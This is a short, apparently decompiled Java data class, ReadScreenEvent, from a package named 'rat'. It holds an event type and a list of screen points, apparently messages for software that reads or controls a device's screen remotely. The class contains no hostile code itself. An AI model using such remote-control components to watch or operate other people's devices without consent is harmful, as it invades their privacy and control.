package com.vendor.rat.network.msg;

import androidx.annotation.NonNull;
import com.vendor.rat.auto.entity.Point;
import java.util.LinkedList;
import java.util.List;

public class ReadScreenEvent extends BaseMsgBody {
    private int eventType;
    private List<Point> points;

    public ReadScreenEvent(int i2) {
        this.points = new LinkedList();
        this.eventType = i2;
    }

    public ReadScreenEvent(int i2, List<Point> list) {
        new LinkedList();
        this.eventType = i2;
        this.points = list;
    }

    public int getEventType() {
        return this.eventType;
    }

    public List<Point> getPoints() {
        return this.points;
    }

    public void setEventType(int i2) {
        this.eventType = i2;
    }

    public void setPoints(List<Point> list) {
        this.points = list;
    }

    @NonNull
    public String toString() {
        return "ReadScreenEvent{eventType=" + this.eventType + ", points=" + this.points + '}';
    }
}
